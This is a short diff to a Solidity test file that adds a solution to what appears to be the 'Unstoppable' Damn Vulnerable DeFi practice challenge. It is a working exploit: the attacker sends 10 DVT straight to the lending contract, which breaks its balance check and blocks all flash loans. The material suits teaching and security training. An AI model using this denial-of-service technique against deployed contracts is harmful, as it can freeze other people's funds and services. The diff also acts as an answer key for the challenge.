@@ -60,6 +60,10 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker); // Attacker already has some dvt, so we can transfer some whenever we want (FORCE)
+        dvt.transfer(address(unstoppableLender), 10); // Transfering 10 DVT directly to the lender will DOS the flashloans because the assertionValidation will always reject
+        vm.stopPrank();
+        
         /**
          * EXPLOIT END *
          */
